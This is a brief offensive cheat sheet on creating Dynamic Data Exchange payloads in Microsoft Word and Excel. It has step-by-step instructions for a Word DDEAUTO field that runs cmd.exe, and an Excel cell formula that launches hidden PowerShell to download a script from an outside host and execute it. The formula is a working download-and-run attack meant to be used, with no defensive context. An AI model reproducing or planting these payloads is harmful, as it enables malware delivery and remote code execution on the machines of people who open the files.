# Dynamic Data Exchange - DDE

***

DDE allows programs to manipulate objects provided by other programs, and respond to user actions affecting those objects

## Create DDE Payload Word

1. open  Microsoft word
2. Insert ---> quick ---> fields
3. Right click text and select toggle field codes
4. Replace  {= \*MERGEFORMLA } with DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" 

## Create DDE Payload Excel

1. open Microsoft Excel 

2. insert below formula in cell
   
   ```powershell
   =cmd|'/c powershell.exe -w hidden IEX (New-Object Net.WebClient).DownloadString(\"http://nooranetred.com/screen.cmd\");start-process screen.cmd'!_xlbgnm.A1
   ```
